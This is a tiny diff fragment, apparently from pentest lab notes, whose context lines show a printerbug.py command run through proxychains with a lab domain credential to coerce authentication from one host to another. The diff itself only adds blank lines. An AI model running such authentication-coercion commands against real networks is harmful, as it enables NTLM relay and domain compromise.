@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:26:05.079234+00:00'
 ```bash
 proxychains python3 printerbug.py ez.lab/matt:Password1\!@ws2.ez.lab ws1@8081/file
 ```
+
+
